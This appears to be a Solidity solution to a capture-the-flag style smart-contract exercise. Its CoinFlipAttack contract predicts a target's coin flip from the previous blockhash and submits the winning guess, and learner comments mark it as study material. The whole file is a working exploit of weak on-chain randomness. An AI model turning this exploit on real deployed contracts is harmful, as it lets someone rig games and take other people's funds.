// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface CoinFlip{
    function flip(bool _guess) external returns (bool);
}
contract CoinFlipAttack {

    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    address immutable instanceToAttack;

    constructor(address _instanceToAttack) {
        instanceToAttack = _instanceToAttack;
    }

    function flipAttack() public {
        //Q what does blockchash do? 
        uint256 blockValue = uint256(blockhash(block.number - 1));

        //Audit Q if blockchash can be inferred, then the Coinflip too
        uint256 coinFlip = blockValue / FACTOR;
        
        bool side = coinFlip == 1 ? true : false;

        CoinFlip(instanceToAttack).flip(side);
    }

}